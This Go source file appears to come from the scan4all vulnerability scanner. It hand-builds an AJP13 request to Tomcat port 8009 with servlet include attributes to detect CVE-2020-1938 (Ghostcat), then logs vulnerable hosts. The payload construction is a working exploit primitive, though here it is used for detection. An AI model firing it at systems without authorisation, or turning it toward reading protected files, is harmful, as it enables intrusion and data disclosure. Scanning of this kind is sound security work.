package tomcat

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"net"
	"regexp"
	"strings"
	"time"
)

const SC_REQ_ACCEPT string = "\xA0\x01"
const SC_REQ_CONNECTION string = "\xA0\x06"
const SC_REQ_CONTENT_LENGTH string = "\xA0\x08" // \b \10
const SC_REQ_HOST string = "\xA0\x0B"           // \v
const SC_REQ_USER_AGENT string = "\xA0\x0E"

const SC_A_REQ_ATTRIBUTE string = "\x0A"

const AJP13_SEND_BODY_CHUNK int = 3
const AJP13_SEND_HEADERS int = 4
const AJP13_END_RESPONSE int = 5
const AJP13_GET_BODY_CHUNK int = 6

func ajp_msg_append_string(ajp_msg_ptr *[]byte, ajp_string string) {
	ajp_msg := *ajp_msg_ptr
	if ajp_string == "" {
		ajp_msg = append(ajp_msg, "\xFF\xFF"...)
	} else {
		ajp_msg = append(ajp_msg, bytes_length(ajp_string)...)
		ajp_msg = append(ajp_msg, ajp_string...)
		ajp_msg = append(ajp_msg, 0x00)
	}
	*ajp_msg_ptr = ajp_msg
}

func ajp_msg_append_sc_string(ajp_msg_ptr *[]byte, ajp_string string, ajp_sc string) {
	ajp_msg := *ajp_msg_ptr
	if strings.HasPrefix(ajp_sc, "\xA0") {
		ajp_msg = append(ajp_msg, ajp_sc...)
	} else {
		ajp_msg = append(ajp_msg, bytes_length(ajp_sc)...)
		ajp_msg = append(ajp_msg, ajp_sc...)
		ajp_msg = append(ajp_msg, 0x00)
	}
	ajp_msg = append(ajp_msg, bytes_length(ajp_string)...)
	ajp_msg = append(ajp_msg, ajp_string...)
	ajp_msg = append(ajp_msg, 0x00)
	*ajp_msg_ptr = ajp_msg
}

func ajp_msg_append_attribute_string(ajp_msg_ptr *[]byte, ajp_string string, ajp_attribute string, ajp_req_attribute string) {
	ajp_msg := *ajp_msg_ptr
	ajp_msg = append(ajp_msg, ajp_attribute...)
	if ajp_req_attribute != "" {
		ajp_msg = append(ajp_msg, bytes_length(ajp_req_attribute)...)
		ajp_msg = append(ajp_msg, ajp_req_attribute...)
		ajp_msg = append(ajp_msg, 0x00)
	}
	ajp_msg = append(ajp_msg, bytes_length(ajp_string)...)
	ajp_msg = append(ajp_msg, ajp_string...)
	ajp_msg = append(ajp_msg, 0x00)
	*ajp_msg_ptr = ajp_msg
}

func bytes_length(ajp_string string) []byte {
	ajp_string_len_buffer := new(bytes.Buffer)
	var ajp_string_len = int16(len(ajp_string))
	binary.Write(ajp_string_len_buffer, binary.BigEndian, ajp_string_len)
	return ajp_string_len_buffer.Bytes()
}

func ajp_msg_append_int16(ajp_msg_ptr *[]byte, ajp_int16 int16) {
	ajp_msg := *ajp_msg_ptr
	ajp_int16_buffer := new(bytes.Buffer)
	binary.Write(ajp_int16_buffer, binary.BigEndian, ajp_int16)
	ajp_msg = append(ajp_msg, ajp_int16_buffer.Bytes()...)
	*ajp_msg_ptr = ajp_msg
}

func ajp_msg_append_int8(ajp_msg_ptr *[]byte, ajp_int8 int8) {
	ajp_msg := *ajp_msg_ptr
	ajp_int8_buffer := new(bytes.Buffer)
	binary.Write(ajp_int8_buffer, binary.BigEndian, ajp_int8)
	ajp_msg = append(ajp_msg, ajp_int8_buffer.Bytes()...)
	*ajp_msg_ptr = ajp_msg
}

func ajp_get_uint16(ajp_msg_ptr *[]byte, start uint16, end uint16) uint16 {
	ajp_msg := *ajp_msg_ptr
	return binary.BigEndian.Uint16(ajp_msg[start : start+end])
}

func ajp_get_string(ajp_msg_ptr *[]byte, start uint16, end uint16) string {
	ajp_msg := *ajp_msg_ptr
	return string(ajp_msg[start : start+end])
}

func readAjpResponseBody(conn net.Conn) (bool, string) {

	//read header
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	header := make([]byte, 4)

	_, err := conn.Read(header)
	if err != nil {
		//fmt.Println("Read failed:", err.Error())
		return false, ""
	}
	_ = ajp_get_string(&header, 0, 2)
	length := ajp_get_uint16(&header, 2, 2)

	content := make([]byte, length)

	_, err = conn.Read(content)
	if err != nil {
		//fmt.Println("Read failed:", err.Error())
		return false, ""
	}
	//read content
	prefix := int(content[0])
	status := ajp_get_uint16(&content, 1, 2)

	if prefix != AJP13_SEND_HEADERS {
		//fmt.Println("Read Ajp Header failed")
		return false, ""
	} else {
		if status == 403 {
			//fmt.Println("Read failed: status ", status)
			return false, ""
		}
	}

	for {
		//read header
		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		header := make([]byte, 4)

		_, err = conn.Read(header)
		if err != nil {
			//fmt.Println("Read failed:", err.Error())
			return true, ""
		}
		_ = ajp_get_string(&header, 0, 2)
		length := ajp_get_uint16(&header, 2, 2)

		content := make([]byte, length)

		_, err = conn.Read(content)
		if err != nil {
			//fmt.Println("Read failed:", err.Error())
			return true, ""
		}
		//read content
		prefix := int(content[0])

		if prefix == AJP13_SEND_BODY_CHUNK {
			dataLength := ajp_get_uint16(&content, 1, 2)
			data := ajp_get_string(&content, 3, dataLength)
			return true, data

		} else if prefix == AJP13_END_RESPONSE {
			return true, ""
		}

	}

}

func makePayload(host string, port int16) []byte {
	payloadBuffer := make([]byte, 0, 8192)
	ajp_msg_append_int8(&payloadBuffer, 2)
	ajp_msg_append_int8(&payloadBuffer, 2)
	ajp_msg_append_string(&payloadBuffer, "HTTP/1.1") //protocol
	ajp_msg_append_string(&payloadBuffer, "/vtest")   //req_uri
	ajp_msg_append_string(&payloadBuffer, host)       //remote_addr (client)
	ajp_msg_append_string(&payloadBuffer, "")         //remote_host (client)
	ajp_msg_append_string(&payloadBuffer, host)       //server_name (server)
	ajp_msg_append_int16(&payloadBuffer, port)        // port (integer)
	ajp_msg_append_int8(&payloadBuffer, 0)            // is_ssl boolean
	ajp_msg_append_int16(&payloadBuffer, 9)           // number of headers (integer)
	ajp_msg_append_sc_string(&payloadBuffer, "text/html", SC_REQ_ACCEPT)
	ajp_msg_append_sc_string(&payloadBuffer, "keep-alive", SC_REQ_CONNECTION)
	ajp_msg_append_sc_string(&payloadBuffer, "0", SC_REQ_CONTENT_LENGTH)
	ajp_msg_append_sc_string(&payloadBuffer, "Mozilla", SC_REQ_USER_AGENT)
	ajp_msg_append_sc_string(&payloadBuffer, host, SC_REQ_HOST)
	ajp_msg_append_sc_string(&payloadBuffer, "gzip, deflate, sdch", "Accept-Encoding")
	ajp_msg_append_sc_string(&payloadBuffer, "en-US,en;q=0.5", "Accept-Language")
	ajp_msg_append_sc_string(&payloadBuffer, "1", "Upgrade-Insecure-Requests")
	ajp_msg_append_sc_string(&payloadBuffer, "max-age=0", "Cache-Control")
	ajp_msg_append_attribute_string(&payloadBuffer, "index", SC_A_REQ_ATTRIBUTE, "javax.servlet.include.request_uri")
	ajp_msg_append_attribute_string(&payloadBuffer, "/", SC_A_REQ_ATTRIBUTE, "javax.servlet.include.servlet_path")
	payloadBuffer = append(payloadBuffer, 0xFF) //request_terminator

	var payloadLen = int16(len(payloadBuffer))
	firstbuffer := make([]byte, 2, 8192)
	firstbuffer[0] = 0x12
	firstbuffer[1] = 0x34
	ajp_msg_append_int16(&firstbuffer, payloadLen) // length of the payload in the forward request
	ajpBuffer := make([]byte, 2, 8192)
	ajpBuffer = append(firstbuffer, payloadBuffer...)

	return ajpBuffer

}

func getVersion(host string, port int16, payload []byte) (bool, string) {

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 10*time.Second)

	if err != nil {
		//fmt.Println("Connect failed:", err.Error())
		return false, ""
	}
	defer conn.Close()

	_, err = conn.Write(payload)
	if err != nil {
		//fmt.Println("Write failed:", err.Error())
		return false, ""
	}
	isVulnerable, responseBody := readAjpResponseBody(conn)
	verRegexp := regexp.MustCompile("<h3>Apache Tomcat/(.*?)</h3>")
	version := verRegexp.FindStringSubmatch(responseBody)
	if len(version) > 1 {
		return isVulnerable, version[1]
	}
	return isVulnerable, "unknown"
}

func CVE_2020_1938(host string) bool {
	ajpBuffer := makePayload(host, 8009)
	isVulnerable, _ := getVersion(host, 8009, ajpBuffer)
	if isVulnerable {
		util.SendLog(host, "CVE-2020-1938", "Found vuln Tomcat", fmt.Sprintf("%v", ajpBuffer))
		return true
	}
	return false
}
